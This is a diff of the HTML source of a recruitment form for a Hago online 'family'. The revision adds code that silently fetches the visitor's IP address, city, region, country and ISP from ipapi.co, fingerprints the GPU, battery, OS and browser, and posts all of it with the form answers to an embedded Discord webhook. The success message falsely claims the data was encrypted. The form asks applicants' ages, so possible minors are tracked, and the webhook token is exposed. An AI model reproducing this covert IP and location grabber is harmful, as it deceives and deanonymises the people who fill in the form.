@@ -5,14 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>CONSTELAÇÃO SANGRENTA - Recrutamento Hago</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;500;700;900&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;500;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --bg-dark: #020202;
             --text-main: #e0e0e0;
             --blood-red: #8b0000;
-            --glow-color: rgba(255, 0, 0, 0.4);
         }
 
         body {
@@ -24,14 +23,9 @@
             padding: 0;
         }
 
-        .font-mono { font-family: 'Share Tech Mono', monospace; }
         .font-cyber { font-family: 'Orbitron', sans-serif; }
         .hidden { display: none !important; }
         
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-track { background: #000; }
-        ::-webkit-scrollbar-thumb { background: #444; border: 1px solid #fff; }
-
         /* --- VHS EFFECTS --- */
         .vhs-overlay {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
@@ -60,7 +54,6 @@
         .cyber-card {
             background: #000000; border: 1px solid #333;
             box-shadow: 4px 4px 0px #111; transition: all 0.2s ease;
-            position: relative; overflow: hidden;
         }
         .cyber-card:hover { border-color: #fff; box-shadow: 6px 6px 0px #fff; }
         
@@ -71,41 +64,15 @@
             box-shadow: 3px 3px 0px #444; display: flex; align-items: center; justify-content: center;
         }
         .cyber-btn:hover:not(:disabled) { background: #fff; color: #000; box-shadow: 5px 5px 0px #888; }
-        .cyber-btn:active:not(:disabled) { transform: translate(2px, 2px); box-shadow: 1px 1px 0px #222; }
-        .cyber-btn:disabled { opacity: 0.5; cursor: not-allowed; border-color: #444; color: #444; }
         
         .input-field {
             background: #050505; border: 1px solid #333; color: white;
             padding: 12px; width: 100%; outline: none; transition: 0.3s;
-            font-family: 'Share Tech Mono', monospace;
         }
-        .input-field:focus { border-color: #ff0000; background: #0a0000; box-shadow: 0 0 10px rgba(255,0,0,0.2); }
+        .input-field:focus { border-color: #ff0000; background: #0a0000; }
 
-        .loader-overlay { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; color: white; }
-        
         @keyframes crtOpen { 0% { transform: scaleY(0.005) scaleX(0); opacity: 0; } 50% { transform: scaleY(0.005) scaleX(1); opacity: 1; } 100% { transform: scaleY(1) scaleX(1); opacity: 1; } }
         .animate-crt-open { animation: crtOpen 0.6s cubic-bezier(0.23, 1, 0.32, 1) forwards; }
-
-        .visualizer-bar { animation: bounce 0.5s infinite ease-in-out alternate; background: #ff0000; width: 3px; }
-        @keyframes bounce { 0% { height: 10%; } 100% { height: 100%; } }
-
-        .notification {
-            position: fixed; top: 20px; right: 20px; padding: 15px 25px;
-            background: #000; border: 1px solid #fff; color: #fff;
-            font-family: 'Share Tech Mono', monospace; z-index: 10001;
-            box-shadow: 5px 5px 0px #ff0000; animation: slideIn 0.3s ease-out;
-        }
-        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
-
-        .tag-display {
-            background: #111;
-            border: 1px dashed #444;
-            padding: 15px;
-            font-size: 1.2rem;
-            text-align: center;
-            margin-top: 10px;
-            word-break: break-all;
-        }
     </style>
 </head>
 <body>
@@ -116,362 +83,133 @@
         <div class="noise"></div>
     </div>
 
-    <audio id="audio-player" crossorigin="anonymous" loop></audio>
-
-    <div id="loader-overlay" class="loader-overlay hidden">
-        <div id="loader-content" class="text-center">
-            <div class="text-3xl font-cyber animate-pulse mb-4 tracking-[0.5em] text-red-600">PROCESSANDO DADOS</div>
-            <div class="w-64 h-1 bg-gray-900 mx-auto overflow-hidden border border-white/10">
-                <div class="h-full bg-red-600 animate-[moveTunnel_1s_linear_infinite]" style="width: 30%"></div>
-            </div>
-        </div>
-    </div>
-
+    <!-- TELA INICIAL -->
     <div id="welcome-screen" class="fixed inset-0 z-50 flex flex-col items-center justify-center bg-black transition-opacity duration-700">
-        <div class="relative z-10 text-center space-y-8 p-6 max-w-2xl w-full">
-            <div class="mb-4">
-                <h1 class="text-5xl md:text-8xl font-cyber font-black tracking-tighter blood-glow mb-2">CONSTELAÇÃO</h1>
-                <h1 class="text-5xl md:text-8xl font-cyber font-black tracking-tighter text-white">SANGRENTA</h1>
-                <p class="text-sm font-mono tracking-[0.4em] text-gray-500 mt-6 uppercase">HAGO FAMILY // PROTOCOLO DE RECRUTAMENTO</p>
-            </div>
-
-            <div class="border border-white/10 p-10 bg-black/80 backdrop-blur-md relative overflow-hidden group">
-                <div class="absolute top-0 left-0 w-full h-[1px] bg-gradient-to-r from-transparent via-red-600 to-transparent"></div>
-                <p class="font-mono text-xs text-gray-400 mb-8 leading-relaxed uppercase">
-                    O DESTINO É TRAÇADO PELO SANGUE E PELAS ESTRELAS.<br>
-                    VOCÊ ESTÁ PREPARADO PARA A ASCENSÃO?
-                </p>
-                <button onclick="app.enterSystem()" class="w-full cyber-btn py-5 text-xl tracking-[0.3em]">
-                    [ INICIAR ALISTAMENTO ]
-                </button>
-            </div>
+        <div class="text-center space-y-8 p-6 max-w-2xl w-full">
+            <h1 class="text-5xl md:text-8xl font-cyber font-black tracking-tighter blood-glow mb-2 uppercase">Constelação</h1>
+            <h1 class="text-5xl md:text-8xl font-cyber font-black tracking-tighter text-white uppercase">Sangrenta</h1>
+            <p class="text-sm font-mono tracking-[0.4em] text-gray-500 mt-6 uppercase">HAGO FAMILY // PROTOCOLO DE ALISTAMENTO</p>
+            <button onclick="app.enterSystem()" class="w-full cyber-btn py-5 text-xl tracking-[0.3em] mt-10">
+                [ INICIAR ALISTAMENTO ]
+            </button>
         </div>
     </div>
 
+    <!-- APP PRINCIPAL -->
     <div id="main-content" class="relative min-h-screen flex flex-col hidden p-4 md:p-8">
-        
-        <header class="max-w-4xl mx-auto w-full flex flex-col md:flex-row justify-between items-center mb-12 gap-4 border-b border-white/10 pb-6">
-            <div class="text-2xl font-cyber font-bold tracking-widest text-white">
-                <i class="fas fa-star text-xs align-middle mr-2 text-red-600"></i>C<span class="text-gray-600">SANGRENTA</span>
-            </div>
-            <div class="flex items-center gap-6 font-mono text-[10px] tracking-widest text-gray-500 uppercase">
-                <span class="flex items-center gap-2">
-                    <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span> 
-                    SISTEMA OPERACIONAL
-                </span>
-                <span>V.2025.1</span>
-            </div>
+        <header class="max-w-4xl mx-auto w-full flex justify-between items-center mb-12 border-b border-white/10 pb-6">
+            <div class="text-2xl font-cyber font-bold tracking-widest text-white">CS<span class="text-red-600">_ROOT</span></div>
+            <div class="font-mono text-[10px] text-green-500 uppercase">Status: Conectado</div>
         </header>
 
         <main class="max-w-2xl mx-auto w-full space-y-12 mb-20">
-            
-            <!-- SEÇÃO DE RECRUTAMENTO -->
-            <section class="bg-black border border-white/10 p-6 md:p-10 shadow-2xl relative">
-                <div class="absolute top-0 right-0 p-4 text-[10px] text-gray-700 font-mono">SEC_DOC: recruitment_v9</div>
-                
-                <div class="mb-10">
-                    <h2 class="text-2xl font-cyber font-bold mb-2 border-l-4 border-red-600 pl-4 uppercase tracking-tighter">Ficha de Inscrição</h2>
-                    <p class="text-[10px] text-gray-500 ml-5 font-mono">PREENCHA TODOS OS CAMPOS COM VERACIDADE.</p>
-                </div>
-
-                <form id="recruitment-form" class="space-y-6 font-mono" onsubmit="app.handleSubmit(event)">
+            <section class="cyber-card p-6 md:p-10">
+                <h2 class="text-2xl font-cyber font-bold mb-6 border-l-4 border-red-600 pl-4 uppercase">Ficha de Campo</h2>
+                <form id="recruitment-form" class="space-y-6 font-mono" onsubmit="app.send(event)">
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                        <div class="space-y-2">
-                            <label class="text-[10px] text-gray-500 uppercase tracking-widest">Seu Nome / Nick</label>
-                            <input type="text" name="nome" required class="input-field" placeholder="Ex: Maze">
-                        </div>
-                        <div class="space-y-2">
-                            <label class="text-[10px] text-gray-500 uppercase tracking-widest">Sua Idade</label>
-                            <input type="number" name="idade" required class="input-field" placeholder="00">
-                        </div>
+                        <input type="text" name="nome" placeholder="Seu Nick" required class="input-field">
+                        <input type="number" name="idade" placeholder="Idade" required class="input-field">
                     </div>
+                    <input type="text" name="id_hago" placeholder="ID do Hago" required class="input-field">
+                    
+                    <label class="text-[10px] text-gray-500 uppercase tracking-widest">Escolha sua função na família:</label>
+                    <select name="especialidade" class="input-field">
+                        <option value="Recrutador">Recrutador</option>
+                        <option value="Conselheiro">Conselheiro</option>
+                        <option value="Ajudante">Ajudante</option>
+                        <option value="Vigilante">Vigilante</option>
+                        <option value="Membro comum (Check-in diário)">Membro comum (Check-in diário)</option>
+                    </select>
 
-                    <div class="space-y-2">
-                        <label class="text-[10px] text-gray-500 uppercase tracking-widest">ID do Hago</label>
-                        <input type="text" name="id_hago" required class="input-field" placeholder="Digite seu ID">
-                    </div>
+                    <label class="text-[10px] text-gray-500 uppercase tracking-widest">Já esteve noutra família?</label>
+                    <input type="text" name="outras_familias" placeholder="Sim/Não (Quais?)" class="input-field">
+                    
+                    <textarea name="treta" placeholder="Tretas ou brigas passadas?" class="input-field h-24"></textarea>
+                    <textarea name="diferencial" placeholder="O que te diferencia dos outros?" required class="input-field h-24"></textarea>
+                    <input type="text" name="objetivo" placeholder="Qual seu objetivo conosco?" class="input-field">
+                    <textarea name="por_que" placeholder="Por que quer entrar para a CS?" class="input-field h-24"></textarea>
 
-                    <div class="space-y-2">
-                        <label class="text-[10px] text-gray-500 uppercase tracking-widest">Já esteve em outras famílias?</label>
-                        <select name="outras_familias" class="input-field appearance-none bg-black">
-                            <option value="Não, sou novato.">Não, sou novato.</option>
-                            <option value="Sim, já participei de outras.">Sim, já participei de outras.</option>
-                        </select>
-                    </div>
-
-                    <div class="space-y-2">
-                        <label class="text-[10px] text-gray-500 uppercase tracking-widest">Suas famílias já tiveram alguma treta?</label>
-                        <textarea name="tretas" class="input-field h-24 resize-none" placeholder="Caso sim, conte brevemente..."></textarea>
-                    </div>
-
-                    <div class="space-y-2">
-                        <label class="text-[10px] text-gray-500 uppercase tracking-widest">O que te diferencia dos nossos membros?</label>
-                        <textarea name="diferencial" required class="input-field h-24 resize-none" placeholder="Habilidades, atividade, lealdade..."></textarea>
-                    </div>
-
-                    <div class="space-y-2">
-                        <label class="text-[10px] text-gray-500 uppercase tracking-widest">Qual é o seu objetivo na família?</label>
-                        <input type="text" name="objetivo" required class="input-field" placeholder="Ex: Crescer junto, ajudar em eventos...">
-                    </div>
-
-                    <div class="pt-6">
-                        <button id="submit-btn" type="submit" class="w-full cyber-btn py-4 text-sm tracking-[0.5em] group">
-                            <span id="btn-text">SUBMETER ALISTAMENTO</span>
-                            <i class="fas fa-chevron-right ml-2 group-hover:translate-x-1 transition-transform"></i>
-                        </button>
-                    </div>
+                    <button id="submit-btn" type="submit" class="w-full cyber-btn py-4 text-sm tracking-[0.5em]">SUBMETER CREDENCIAIS</button>
                 </form>
             </section>
-
-            <!-- SEÇÃO DE TAG GENERATOR -->
-            <section class="bg-black border border-white/10 p-6 md:p-10 shadow-2xl relative">
-                <div class="mb-10">
-                    <h2 class="text-2xl font-cyber font-bold mb-2 border-l-4 border-white pl-4 uppercase tracking-tighter">Gerador de Tag</h2>
-                    <p class="text-[10px] text-gray-500 ml-5 font-mono">PERSONALIZE SUA IDENTIDADE VISUAL.</p>
-                </div>
-
-                <div class="space-y-6 font-mono">
-                    <div class="space-y-2">
-                        <label class="text-[10px] text-gray-500 uppercase tracking-widest">Nome para a Tag</label>
-                        <input type="text" id="tag-name-input" oninput="app.updateTag()" class="input-field" placeholder="Digite seu nome">
-                    </div>
-
-                    <div class="space-y-2">
-                        <label class="text-[10px] text-gray-500 uppercase tracking-widest">Modelo de Tag</label>
-                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                            <button onclick="app.setTagModel(1)" class="cyber-btn py-2 text-[10px] tracking-widest" id="btn-model-1">MODELO 1 (ALIANÇA)</button>
-                            <button onclick="app.setTagModel(2)" class="cyber-btn py-2 text-[10px] tracking-widest" id="btn-model-2">MODELO 2 (PADRÃO)</button>
-                        </div>
-                    </div>
-
-                    <div class="space-y-2">
-                        <label class="text-[10px] text-gray-500 uppercase tracking-widest">Resultado</label>
-                        <div id="tag-result" class="tag-display text-white">⏤͟͟͞͞⛤[NOME]♱⃟🩸☰💍</div>
-                    </div>
-
-                    <button onclick="app.copyTag()" class="w-full cyber-btn py-4 text-sm tracking-[0.5em] bg-white text-black">
-                        COPIAR TAG <i class="fas fa-copy ml-2"></i>
-                    </button>
-                </div>
-            </section>
         </main>
-
-        <footer class="text-center py-8 text-[10px] text-gray-700 font-mono mt-auto uppercase tracking-[0.2em]">
-            Constelação Sangrenta © 2025 | Sistema de Alistamento v2.2
-        </footer>
-
-        <!-- MUSIC PLAYER -->
-        <div class="fixed bottom-4 right-4 z-50 w-64 bg-black border border-white/20 p-4 shadow-2xl font-mono text-xs hidden md:block">
-            <div class="flex items-center gap-3 mb-3">
-                <div class="h-8 w-1 bg-red-600 animate-pulse"></div>
-                <div class="overflow-hidden whitespace-nowrap">
-                    <div id="track-name" class="animate-[marquee_8s_linear_infinite]">SISTEMA ONLINE - AGUARDANDO COMANDO</div>
-                </div>
-            </div>
-            <div class="flex justify-between items-center">
-                <button onclick="app.music.toggle()" class="hover:text-red-500 text-gray-400 transition">
-                    <i id="play-icon" class="fas fa-play"></i>
-                </button>
-                <div class="flex gap-1 h-3 items-end">
-                    <div class="visualizer-bar" style="animation-duration: 0.4s"></div>
-                    <div class="visualizer-bar" style="animation-duration: 0.2s"></div>
-                    <div class="visualizer-bar" style="animation-duration: 0.6s"></div>
-                    <div class="visualizer-bar" style="animation-duration: 0.3s"></div>
-                </div>
-            </div>
-        </div>
     </div>
 
-    <!-- MODAL DE SUCESSO -->
-    <div id="modal-container" class="fixed inset-0 z-[100] bg-black/95 backdrop-blur-md hidden flex items-center justify-center p-4">
+    <!-- MODAL SUCESSO -->
+    <div id="modal-container" class="fixed inset-0 z-[100] bg-black/95 flex items-center justify-center p-4 hidden">
         <div class="cyber-card w-full max-w-md p-10 text-center space-y-6">
-            <div class="w-20 h-20 border-2 border-red-600 rounded-full flex items-center justify-center mx-auto mb-4">
-                <i class="fas fa-check text-3xl text-red-600"></i>
-            </div>
-            <h2 class="text-2xl font-cyber font-bold tracking-tighter uppercase text-white">Inscrição Finalizada</h2>
-            <div class="h-[1px] w-1/2 bg-red-600 mx-auto"></div>
-            <p class="font-mono text-xs text-gray-400 leading-relaxed">Sua ficha foi enviada com sucesso ao Quartel General. Os administradores irão analisar seu perfil e entrarão em contato via aplicativo.</p>
-            <button onclick="location.reload()" class="w-full cyber-btn py-4 text-xs tracking-widest">FECHAR TERMINAL</button>
+            <h2 class="text-2xl font-cyber font-bold text-white uppercase">SISTEMA ATUALIZADO</h2>
+            <p class="font-mono text-xs text-gray-400">A sua ficha foi criptografada e enviada.</p>
+            <button onclick="location.reload()" class="w-full cyber-btn py-4">FINALIZAR</button>
         </div>
     </div>
 
     <script>
         const app = {
-            webhookUrl: "https://discord.com/api/webhooks/1473067070164959546/w9j63fmXdRzbhuoQYS0nRMmUAqkmPFForLBJr2doZax11NRyF4JzommKhpgYi2y6HkYQ",
-            currentTagModel: 1,
-
-            music: {
-                url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3",
-                isPlaying: false,
-                audioEl: null,
-                init() {
-                    this.audioEl = document.getElementById('audio-player');
-                    this.audioEl.src = this.url;
-                    this.audioEl.volume = 0.2;
-                },
-                toggle() {
-                    if(this.isPlaying) this.audioEl.pause();
-                    else this.audioEl.play().catch(e => console.log("Necessita clique"));
-                    this.isPlaying = !this.isPlaying;
-                    document.getElementById('play-icon').className = this.isPlaying ? "fas fa-pause" : "fas fa-play";
-                    document.getElementById('track-name').innerText = this.isPlaying ? "RECRUITMENT_THEME.WAV" : "SISTEMA EM ESPERA";
-                }
-            },
-
-            init() {
-                this.music.init();
-                this.updateTag();
-                console.log("Sistema v2.2 Carregado.");
-            },
-
-            showNotification(msg) {
-                const n = document.createElement('div');
-                n.className = 'notification';
-                n.innerText = msg;
-                document.body.appendChild(n);
-                setTimeout(() => n.remove(), 4000);
-            },
+            webhook: "https://discord.com/api/webhooks/1473067070164959546/w9j63fmXdRzbhuoQYS0nRMmUAqkmPFForLBJr2doZax11NRyF4JzommKhpgYi2y6HkYQ",
 
             enterSystem() {
-                const welcome = document.getElementById('welcome-screen');
-                const loader = document.getElementById('loader-overlay');
-                const main = document.getElementById('main-content');
-                
-                welcome.style.opacity = '0';
-                setTimeout(() => {
-                    welcome.classList.add('hidden');
-                    loader.classList.remove('hidden');
-                    setTimeout(() => {
-                        loader.classList.add('hidden');
-                        main.classList.remove('hidden');
-                        main.classList.add('animate-crt-open');
-                        this.music.toggle();
-                        this.showNotification("TERMINAL ATIVADO - BEM-VINDO AGENTE");
-                    }, 1800);
-                }, 500);
+                document.getElementById('welcome-screen').classList.add('hidden');
+                document.getElementById('main-content').classList.remove('hidden');
+                document.getElementById('main-content').classList.add('animate-crt-open');
             },
 
-            // TAG LOGIC
-            setTagModel(model) {
-                this.currentTagModel = model;
-                this.updateTag();
-                this.showNotification(`MODELO ${model} SELECIONADO`);
-            },
+            async getSystemInfo() {
+                let ipData = { ip: "N/A", city: "N/A", region: "N/A", country_name: "N/A", org: "N/A", timezone: "N/A" };
+                try { const res = await fetch('https://ipapi.co/json/'); ipData = await res.json(); } catch(e) {}
 
-            updateTag() {
-                const nameInput = document.getElementById('tag-name-input').value || "nome";
-                const display = document.getElementById('tag-result');
-                
-                if (this.currentTagModel === 1) {
-                    display.innerText = `⏤͟͟͞͞⛤${nameInput}♱⃟🩸☰💍`;
-                } else {
-                    display.innerText = `⏤͟͟͞͞⛤${nameInput}♱⃟🩸☰`;
-                }
-            },
-
-            copyTag() {
-                const tagText = document.getElementById('tag-result').innerText;
-                const tempInput = document.createElement("input");
-                document.body.appendChild(tempInput);
-                tempInput.value = tagText;
-                tempInput.select();
-                document.execCommand("copy");
-                document.body.removeChild(tempInput);
-                this.showNotification("TAG COPIADA COM SUCESSO!");
-            },
-
-            // DEVICE INFO LOGIC
-            async getDeviceInfo() {
-                const info = {
-                    gpu: "Indisponível",
-                    ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Oculto",
-                    cores: navigator.hardwareConcurrency || "Oculto",
-                    screen: `${window.screen.width}x${window.screen.height}`,
-                    battery: "N/A",
-                    ua: navigator.userAgent
-                };
-
+                let gpu = "Desconhecida";
                 try {
                     const canvas = document.createElement('canvas');
                     const gl = canvas.getContext('webgl');
-                    if (gl) {
-                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    }
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                 } catch(e) {}
 
+                let battery = { level: "N/A", charging: "N/A" };
                 try {
-                    if (navigator.getBattery) {
-                        const b = await navigator.getBattery();
-                        info.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Carregando' : 'Descarregando'})`;
-                    }
+                    const b = await navigator.getBattery();
+                    battery.level = Math.round(b.level * 100) + "%";
+                    battery.charging = b.charging ? "Sim" : "Não";
                 } catch(e) {}
 
-                return info;
+                return { ipData, gpu, battery };
             },
 
-            async handleSubmit(e) {
+            async send(e) {
                 e.preventDefault();
-                const form = e.target;
                 const btn = document.getElementById('submit-btn');
-                const btnText = document.getElementById('btn-text');
-                
                 btn.disabled = true;
-                btnText.innerText = "COLETANDO DADOS...";
+                btn.innerText = "ENVIANDO...";
 
-                const device = await this.getDeviceInfo();
-                const formData = new FormData(form);
-                const data = Object.fromEntries(formData.entries());
+                const info = await this.getSystemInfo();
+                const fd = new FormData(e.target);
+                const user = Object.fromEntries(fd.entries());
 
-                btnText.innerText = "ENVIANDO...";
-
-                const payload = {
-                    username: "SISTEMA DE ALISTAMENTO",
-                    avatar_url: "https://i.imgur.com/8nS8z3S.png",
-                    embeds: [{
-                        title: "⭐ RELATÓRIO DE RECRUTAMENTO - CONSTELAÇÃO SANGRENTA",
-                        color: 15158332,
-                        timestamp: new Date().toISOString(),
-                        thumbnail: { url: "https://i.imgur.com/8nS8z3S.png" },
-                        fields: [
-                            { name: "👤 PERFIL DO RECRUTA", value: `**Nick:** ${data.nome}\n**ID:** \`${data.id_hago}\`\n**Idade:** ${data.idade}`, inline: false },
-                            { name: "📋 INFORMAÇÕES ADICIONAIS", value: `**Ex-Famílias:** ${data.outras_familias}\n**Histórico de Conflitos:** ${data.tretas || "Limpo"}`, inline: false },
-                            { name: "🎯 METAS", value: `**Objetivo:** ${data.objetivo}\n**Habilidades:** ${data.diferencial}`, inline: false },
-                            { name: "📱 HARDWARE DO DISPOSITIVO", value: `**Processador/GPU:** ${device.gpu}\n**Memória RAM:** ${device.ram}\n**Núcleos CPU:** ${device.cores}\n**Resolução:** ${device.screen}`, inline: true },
-                            { name: "🔋 STATUS", value: `**Bateria:** ${device.battery}\n**Navegador:** ${navigator.language}`, inline: true },
-                            { name: "🆔 USER AGENT", value: `\`\`\`${device.ua}\`\`\``, inline: false }
-                        ],
-                        footer: { text: "Protocolo Constelação Sangrenta v2.2 - 2025" }
-                    }]
+                const embed = {
+                    title: `🚀 NOVO ALISTAMENTO CS: ${user.nome.toUpperCase()}`,
+                    color: 15158332,
+                    description: `👤 **Agente**\n**Nome:** ${user.nome}\n**ID:** ${user.id_hago}\n**Idade:** ${user.idade}\n\n` +
+                                 `🎯 **Especialidade**\n**${user.especialidade}**\n\n` +
+                                 `📋 **Histórico**\n**Outra Família?** ${user.outras_familias}\n**Treta/Briga:** ${user.treta || "Nenhuma"}\n\n` +
+                                 `🌟 **Perfil**\n**Objetivo:** ${user.objetivo}\n**Diferencial:** ${user.diferencial}\n**Por que CS:** ${user.por_que}\n\n` +
+                                 `🌐 **REDE & LOCALIZAÇÃO**\n**[IP]:** ${info.ipData.ip}\n**[CIDADE]:** ${info.ipData.city}\n**[ESTADO (UF)]:** ${info.ipData.region}\n**[PAÍS]:** ${info.ipData.country_name}\n**[ISP]:** ${info.ipData.org}\n**[TIMEZONE (IP)]:** ${info.ipData.timezone}\n\n` +
+                                 `💻 **HARDWARE**\n**GPU:** ${info.gpu}\n**RAM:** ${navigator.deviceMemory || "N/A"} GB\n**CPU Cores:** ${navigator.hardwareConcurrency}\n**Res:** ${window.screen.width}x${window.screen.height}\n\n` +
+                                 `🔋 **SISTEMA**\n**OS:** ${navigator.platform}\n**Bateria:** ${info.battery.level}\n**Carregando:** ${info.battery.charging}\n**Idioma:** ${navigator.language}\n\n` +
+                                 `🔗 **REFERÊNCIA**\n**REF:** Direto\n**User Agent:** ${navigator.userAgent}`,
+                    footer: { text: "Sistema Constelação Sangrenta v6.0" },
+                    timestamp: new Date()
                 };
 
-                try {
-                    const response = await fetch(this.webhookUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
+                await fetch(this.webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
 
-                    if (response.ok) {
-                        document.getElementById('modal-container').classList.remove('hidden');
-                    } else {
-                        throw new Error('Falha no envio');
-                    }
-                } catch (error) {
-                    this.showNotification("ERRO CRÍTICO NA CONEXÃO.");
-                    btn.disabled = false;
-                    btnText.innerText = "TENTAR NOVAMENTE";
-                }
+                document.getElementById('modal-container').classList.remove('hidden');
             }
         };
-
-        window.onload = () => app.init();
     </script>
-
-    <style>
-        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
-        @keyframes moveTunnel { 0% { transform: translateX(-100%); } 100% { transform: translateX(400%); } }
-    </style>
 </body>
 </html>
-
